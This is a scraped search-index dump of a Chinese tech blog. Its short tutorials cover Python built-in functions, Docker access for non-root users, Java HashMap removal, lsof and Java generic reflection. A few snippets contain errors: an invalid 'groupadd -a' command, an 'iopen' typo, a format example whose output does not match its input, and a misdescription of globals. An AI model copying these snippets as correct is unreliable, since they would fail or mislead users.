扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之abs/"},{"title":"190703-docker非root用户可使用配置","text":"docker要求使用root权限进行启动，但是启动之后，普通的账号会发现没有访问docker的权限，然而每次都使用root进行访问过于麻烦，那么有办法让普通账号也能正常访问么? docker安装完毕之后，启动 1sudo systemctl restart docker 然后使用普通账号进行访问，提示如下 1Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.39/containers/json?all=1: dial unix /var/run/docker.sock: connect: permission denied 因为权限被拒绝，下面是解决办法 1. 创建docker组 1sudo groupadd docker 2. 将用户加入docker组 1234# 将yihui这个用户，添加到docker组sudo groupadd -a yihui docker# 或者使用下面的将当前用户添加到docker组sudo gpasswd -a ${USER} docker 3. 重启docker 1sudo systemctl restart docker 4. 测试 可能在某些情况下，需要断开连接重新登录才有权限继续访问 1docker ps -a II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/07/03/190703-docker非root用户可使用配置/"},{"title":"190715 Python 内置函数之any","text":"any与all作用比较像，区别在于只要有一个为true，则返回True 1234&gt;&gt;&gt; any([0, '', False])False&gt;&gt;&gt; any([1, '', False])True II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之any/"},{"title":"190715 Python 内置函数之bytearray","text":"返回一个新字节数组。这个数组里的元素是可变的，并且每个元素的值范围: 0 &lt;= x &lt; 256 语法： 1class bytearray([source[, encoding[, errors]]]) 参数说明: source 为整数，则返回一个长度为source的初始化数组 字符串，则按照指定的 encoding 将字符串转换为字节序列 迭代类型，则元素必须为[0,255]之间的整数 无参数，初始化数组个数为0 实例 12345678910&gt;&gt;&gt; bytearray('hello', 'utf-8')bytearray(b'hello')&gt;&gt;&gt; bytearray(2)bytearray(b'\\x00\\x00')&gt;&gt;&gt; bytearray([1,2,3])bytearray(b'\\x01\\x02\\x03')&gt;&gt;&gt; a = bytearray([1,2,3])&gt;&gt;&gt; a[1] = 20&gt;&gt;&gt; abytearray(b'\\x01\\x14\\x03') II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之bytearray/"},{"title":"190715 Python 内置函数之bool","text":"bool() 函数用于将给定参数转换为布尔类型，如果没有参数，返回 False。 bool 是 int 的子类。 123456&gt;&gt;&gt; bool('True')True&gt;&gt;&gt; bool('true')True&gt;&gt;&gt; bool(2)True II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之bool/"},{"title":"190715 Python 内置函数之bytes","text":"返回一个新的 bytes 对象，该对象是一个 0 &lt;= x &lt; 256 区间内的整数不可变序列。它是 bytearray 的不可变版本。 基本用法和 bytearray 相似，唯一区别是返回的数组是不可变的 举例如下 123456789101112&gt;&gt;&gt; bytes([1,2,3])b'\\x01\\x02\\x03'&gt;&gt;&gt; bytes('hello', 'utf-8')b'hello'&gt;&gt;&gt; bytes(1)b'\\x00'&gt;&gt;&gt; a = bytes([1,2,3])&gt;&gt;&gt; a[1] = 20Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: 'bytes' object does not support item assignment 请注意，数组内容不可变，强制赋值时抛异常 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之bytes/"},{"title":"190715 Python 内置函数之bin","text":"bin() 返回一个整数 int 或者长整数 long int 的二进制表示。 1234&gt;&gt;&gt; bin(10)'0b1010'&gt;&gt;&gt; bin(16)'0b10000' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之bin/"},{"title":"190715 Python 内置函数之ascii","text":"ascii() 函数类似 repr() 函数, 返回一个表示对象的字符串, 但是对于字符串中的非 ASCII 字符则返回通过 repr() 函数使用 \\x, \\u 或 \\U 编码的字符 举例如下： 12&gt;&gt;&gt; ascii('你好hello')\"'\\\\u4f60\\\\u597dhello'\" II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之ascii/"},{"title":"190715 Python 内置函数之callable","text":"检查一个对象是否是可调用，对于函数、方法、lambda 函式、 类以及实现了 __call__ 方法的类实例, 它都返回 True 1234567891011121314151617181920&gt;&gt;&gt; callable(10)False&gt;&gt;&gt; def a():... return 1...&gt;&gt;&gt; callable(a)True&gt;&gt;&gt; class A:... def m():... pass...&gt;&gt;&gt; callable(A)True&gt;&gt;&gt; a = A()&gt;&gt;&gt; callable(a)&gt;&gt;&gt; callable(a.m)True II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之callable/"},{"title":"190715 Python 内置函数之classmethod","text":"修饰符对应的函数不需要实例化，不需要self参数，第一个参数需要是表示自身类的cls参数，可以来调用类的属性，类的方法，实例化对象 举例如下: 1234567891011121314&gt;&gt;&gt; class A:... a = 10... def m1(self):... print(\"m1\")...... @classmethod... def m2(cls):... print(cls.a)... # 创建对象，然后再访问方法... cls().m1()...&gt;&gt;&gt; A.m2()10m1 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之classmethod/"},{"title":"190715 Python 内置函数之chr","text":"chr() 参数为整数，返回一个对应的字符 123456&gt;&gt;&gt; chr(10)'\\n'&gt;&gt;&gt; chr(78)'N'&gt;&gt;&gt; chr(22020)'嘄' 请注意传参可以为10进制，也可以为16进制，取值为 [0,114111]/[0,0x10FFFF]) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之chr/"},{"title":"190715 Python 内置函数之compile","text":"将一个字符串编译为字节代码 这个比较厉害了，传入一段字符串，把它编译成可执行的脚本 语法 1compile(source, filename, mode[, flags[, dont_inherit]]) source – 字符串或者AST（Abstract Syntax Trees）对象。。 filename – 代码文件名称，如果不是从文件读取代码则传递一些可辨认的值。 mode – 指定编译代码的种类。可以指定为 exec, eval, single。 flags – 变量作用域，局部命名空间，如果被提供，可以是任何映射对象。。 flags和dont_inherit是用来控制编译源码时的标志 举例说明 123&gt;&gt;&gt; str = \"for i in range(0,10): print(i)\"&gt;&gt;&gt; c = compile(str, '', 'exec')&gt;&gt;&gt; exec(c) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之compile/"},{"title":"190715 Python 内置函数之dict","text":"dict用于创建字典 123456&gt;&gt;&gt; dict(){}&gt;&gt;&gt; dict(a='a', b='b', c='c'){'a': 'a', 'b': 'b', 'c': 'c'}&gt;&gt;&gt; dict([(1,10), (2, 20), (3,30)]){1: 10, 2: 20, 3: 30} 请注意，传参为可迭代的序列的场景 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之dict/"},{"title":"190715 Python 内置函数之complex","text":"数学中的复数，通过complex可以简单的生成 1234&gt;&gt;&gt; complex(1, 2)(1+2j)&gt;&gt;&gt; complex(\"1+2j\")(1+2j) 注意，字符串转换时，加号左右两边不能有空格 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之complex/"},{"title":"190715 Python 内置函数之dir","text":"不带参数时，返回当前范围内的变量、方法和定义的类型列表；带参数时，返回参数的属性、方法列表 语法 1dir([object]) 实例 12345678&gt;&gt;&gt; class A:... x = 10... def m():... print('haha')...&gt;&gt;&gt; a = A()&gt;&gt;&gt; dir(a)['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'm', 'x'] II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之dir/"},{"title":"190715 Python 内置函数之delattr","text":"顾名思义，这个使用来删除属性的 delattr(x, 'foobar') 相等于 del x.foobar 举例说明 1234567891011121314class A:... x = 10... y = 10... z = 20&gt;&gt;&gt; delattr(A, 'z')&gt;&gt;&gt; a = A()&gt;&gt;&gt; a.x10&gt;&gt;&gt; a.zTraceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AttributeError: 'A' object has no attribute 'z' 不太知道什么场景会用这个 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之delattr/"},{"title":"190715 Python 内置函数之enumerate","text":"将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标 一个常见的使用case 1234567&gt;&gt;&gt; seq = ['one', 'two', 'three']&gt;&gt;&gt; for i, element in enumerate(seq):... print(i, element)...0 one1 two2 three II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之enumerate/"},{"title":"190715 Python 内置函数之divmod","text":"接收两个数字类型（非复数）参数，返回一个包含商和余数的元组(a // b, a % b) 12&gt;&gt;&gt; divmod(10, 3)(3, 1) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之divmod/"},{"title":"190715 Python 内置函数之eval","text":"主要用来执行字符串表达式，和 compile有一些区别，后者功能更加强大，可以编译字符串格式的python代码，而eval更多的是基础运算 举例如下： 12345678&gt;&gt;&gt; a = 10&gt;&gt;&gt; eval('a + 10')20&gt;&gt;&gt; eval('pow(a,2)')100&gt;&gt;&gt; b = [1,2]&gt;&gt;&gt; eval('b[1]')2 请注意，eval对表达式有限定，如果需要更丰富的支持，可以考虑exec II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之eval/"},{"title":"190715 Python 内置函数之float","text":"将整数和字符串转换成浮点数 1234&gt;&gt;&gt; float(1)1.0&gt;&gt;&gt; float('12')12.0 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之float/"},{"title":"190715 Python 内置函数之filter","text":"用于过滤序列，过滤掉不符合条件的元素，返回一个迭代器对象，如果要转换为列表，可以使用 list() 来转换 1filter(function, iterable) function: 过滤函数 iterable: 序列 实例如下 12345&gt;&gt;&gt; def f(s):... return s % 2 == 0...&gt;&gt;&gt; a = filter(f, [1,2,3,4])&gt;&gt;&gt; list(a) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之filter/"},{"title":"190716 Python 内置函数之globals","text":"以字典的方式返回当前的所有的局部变量 123&gt;&gt;&gt; globals(){'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;}&gt;&gt;&gt; II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之globals/"},{"title":"190715 Python 内置函数之getattr","text":"返回一个对象属性值 1234567891011121314151617&gt;&gt;&gt; class A:... a = 1... b = 2...&gt;&gt;&gt; a = A()&gt;&gt;&gt; getattr(a, 'a')1&gt;&gt;&gt; a.a1# 获取一个不存在的属性值&gt;&gt;&gt; getattr(a, 'c')Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;AttributeError: 'A' object has no attribute 'c'# 如果不存在，则返回默认值&gt;&gt;&gt; getattr(a, 'c', 3)3 请注意：如果获取属性不存在，且没有设置默认值时，会抛异常 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/15/190715-Python-内置函数之getattr/"},{"title":"190716 Python 内置函数之help","text":"help，主要就是用来显示帮助信息，如果对某个函数的用法不太清楚，就可以直接通过help来查看(在普遍用idea作为开发工具的情况下，基本上不太会用到…) 1help('str') II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之help/"},{"title":"190715 Python 内置函数之frozenset","text":"返回一个固定的集合，不允许添加or删除、修改集合 1&gt;&gt;&gt; a = frozenset(range(10)) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之frozenset/"},{"title":"190716 Python 内置函数之hash","text":"计算一个对象or数字or字符串的hash值 1234&gt;&gt;&gt; hash('hello world')-2288959098694490958&gt;&gt;&gt; hash(123)123 II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/16/190716-Python-内置函数之hash/"},{"title":"190625-Python 文件读取","text":"文件按行读取的两种方式 case1: 12for line in iopen('demo.txt', 'r+'): print(f) case2: 123with open('demo.txt', 'r+') as f: for line in f.readlines(): print(line) II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/06/25/190625-Python-文件读取/"},{"title":"190529-Java之HashMap迭代删除使用方法小结","text":"map的迭代删除，和我们常见的list，set不太一样，不能直接获取Iteraotr对象，提供的删除方法也是单个的，根据key进行删除，如果我们有个需求，将map中满足某些条件的元素删除掉，要怎么做呢？ I. Map 迭代删除迭代删除，在不考虑并发安全的前提下，我们看下可以怎么支持 1. 非常不优雅版本我们知道map并不是继承自Collection接口的，HashMap 也没有提供迭代支持，既然没法直接迭代，那我就老老实的low b版好了 12345678910111213Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();map.put(\"a\", 1);map.put(\"b\", 2);map.put(\"c\", 3);map.put(\"d\", 4);List&lt;String&gt; removeKey = new ArrayList&lt;&gt;();for (Map.Entry&lt;String, Integer&gt; e: map.entrySet()) { if (e.getValue() % 2== 0) { removeKey.add(e.getKey()); }}removeKey.forEach(map::remove); 上面的实现怎么样？并没有什么毛病 (为啥不直接在遍历中删除？） 2. 正确姿势版虽然Map没有迭代，但是它的entrySet有啊，所以我们可以通过它来实现遍历删除 123456789101112131415Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();map.put(\"a\", 1);map.put(\"b\", 2);map.put(\"c\", 3);map.put(\"d\", 4);Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; iterator = map.entrySet().iterator();Map.Entry&lt;String, Integer&gt; entry;while (iterator.hasNext()) { entry = iterator.next(); if (entry.getValue() % 2 == 0) { iterator.remove(); }}System.out.println(map); 上面这个可能是我们经常使用的操作姿势了，利用迭代器来操作元素 3. 简洁版到jdk8之后，针对容器提供了很多简洁的操作方式，迭代删除这方面可以说更加简单了 123456Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;();map.put(\"a\", 1);map.put(\"b\", 2);map.put(\"c\", 3);map.put(\"d\", 4);map.entrySet().removeIf(entry -&gt; entry.getValue() % 2 == 0); II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/05/29/190529-Java之HashMap迭代删除使用方法小结/"},{"title":"190124-查看进程tcp连接情况","text":"如何查看一个进程的tcp连接情况? 1lsof -p 进程号 -nP | grep TCP II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/24/190124-查看进程tcp连接情况/"},{"title":"190715 Python 内置函数之format","text":"字符串格式化函数 str.format() 1234&gt;&gt;&gt; \"{} {}\".format(\"hello\", \"world\")'hello world'&gt;&gt;&gt; \"{0} {1} {0}\".format(\"hello\", \"world\")'hello world hello' 除了使用上面序号的方式，还可以用key的方式，如下 12345&gt;&gt;&gt; \"{name} haha {age}\".format(name='yhh', age=20)'yhh haha 20'&gt;&gt;&gt; \"{name} haha {age}\".format(**{\"name\": \"yhh\", \"age\": 18})'yhh haha 20' 注意，传参为dict时，前面要加两个星号 数字格式化 12&gt;&gt;&gt; \"{:.2f}\".format(3.1415926)'3.14' II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog","link":"/hexblog/2019/07/15/190715-Python-内置函数之format/"},{"title":"180530-通过反射获取泛型类的实际参数","text":"反射获取泛型类的实际参数泛型用得还是比较多的，那么如何获取泛型类上实际的参数类型呢？ 比如一个接口为 12public interface IBolt&lt;T, K&gt; {} 现在给一个IBolt的具体实现类，可以获取到实际的参数类型么？下面几种case可以怎么获取实际的IBolt中的T和K类型呢？ 1234567891011121314// 实现接口方式public class ABolt implements IBolt&lt;String, Boolean&gt;{}public class AFBolt&lt;T&gt; implements IBolt&lt;String, T&gt; {}public interface EBolt&lt;T&gt; extends IBolt&lt;String, T&gt; {}public class AEBolt implements EBolt&lt;Boolean&gt; {}public interface RBolt extends IBolt&lt;String, Boolean&gt;{}public class ARBolt implements RBolt{}// 继承抽象类方式public abstract class AbsBolt&lt;T,K&gt; implements IBolt&lt;T,K&gt; {}public class BBolt extends AbsBolt&lt;String, Boolean&gt; {}public abstract class EAbsBolt&lt;T&gt; implements IBolt&lt;String, T&gt; {}public class BEBolt extends EAbsBolt&lt;Boolean&gt; {} I. 基本姿势首先拿最简单的两个case来进行分析，一个是 ABolt, 一个是BBolt，根据这两个类信息来获取对应的泛型类型； 1. 接口实现方式获取主要借助的就是右边这个方法：java.lang.Class#getGenericInterfaces a. 简单对比 Type[] getGenericInterfaces 以Type的形式返回本类直接实现的接口.这样就包含了泛型参数信息 Class[] getInterfaces 返回本类直接实现的接口.不包含泛型参数信息 b. 编码实现一个基础的实现方式如下 12345678910111213141516171819@Testpublic void testGetTypes() { Type[] types = ABolt.class.getGenericInterfaces(); ParameterizedType ptype; for (Type type: types) { if (!(type instanceof ParameterizedType)) { // 非泛型类型，直接丢掉 continue; } ptype = (ParameterizedType) type; if (IBolt.class.equals(ptype.getRawType())) { // 如果正好是我们需要获取的IBolt对象，则直接获取 Type[] parTypes = ptype.getActualTypeArguments(); for (Type par: parTypes) { System.out.println(par.getTypeName()); } } }} 简单分析上面实现: 首先是获取所有的接口信息，遍历接口， 如果这个接口是支持泛型的，则返回的type应该是ParameterizedType类型 获取原始类信息（主要目的是为了和目标类进行对比 IBolt.class.equals(ptype.getRawType())） 获取泛型类型 ptype.getActualTypeArguments() 输出结果如下: 12java.lang.Stringjava.lang.Boolean 上面这个实现针对ABolt还可以，但是换成 AEBolt 之后，即非直接实现目标接口的情况下，发现什么都获取不到，因为 IBolt.class.equals(ptype.getRawType()) 这个条件不会满足，稍稍改一下，改成只要是IBolt的子类即可 12345678910111213141516171819@Testpublic void testGetTypes() { Type[] types = AEBolt.class.getGenericInterfaces(); ParameterizedType ptype; for (Type type: types) { if (!(type instanceof ParameterizedType)) { // 非泛型类型，直接丢掉 continue; } ptype = (ParameterizedType) type; if (ptype.getRawType() instanceof Class &amp;&amp; IBolt.class.isAssignableFrom((Class&lt;?&gt;) ptype.getRawType())) { // 如果正好是我们需要获取的IBolt对象，则直接获取 Type[] parTypes = ptype.getActualTypeArguments(); for (Type par: parTypes) { System.out.println(par.getTypeName()); } } }} 此时输出为如下，实际上只是EBolt上的泛型类型，与我们期望的输出 (String, Boolean) 不符，后面再说 1java.lang.Boolean 2. 抽象类继承方式获取抽象类与接口的主要区别在于类是单继承的，所以改成用 java.lang.Class#getGenericSuperclass 获取 a. 简单对比 Type getGenericSuperclass() 返回父类的基本类信息，包含泛型参数信息 Class&lt;? super T&gt; getSuperclass(); 返回父类信息，不包含泛型 b. 代码实现同上面的差不多，针对BBolt的实现，可以这么来 12345678910111213141516171819202122232425262728@Testpublic void testGetAbsTypes() { Class basicClz = BBolt.class; Type type; ParameterizedType ptype; while (true) { if (Object.class.equals(basicClz)) { break; } type = basicClz.getGenericSuperclass(); if (!(type instanceof ParameterizedType)) { basicClz = basicClz.getSuperclass(); continue; } ptype = (ParameterizedType) type; if (ptype.getRawType() instanceof Class &amp;&amp; IBolt.class.isAssignableFrom((Class&lt;?&gt;) ptype.getRawType())) { Type[] parTypes = ptype.getActualTypeArguments(); for (Type par : parTypes) { System.out.println(par.getTypeName()); } break; } else { basicClz = basicClz.getSuperclass(); } }} 针对上面代码简单进行分析，步骤如下： 获取父类（包含泛型）信息 如果父类没有泛型信息，则继续往上获取父类信息 包含泛型信息之后，判断这个类是否为我们预期的目标类 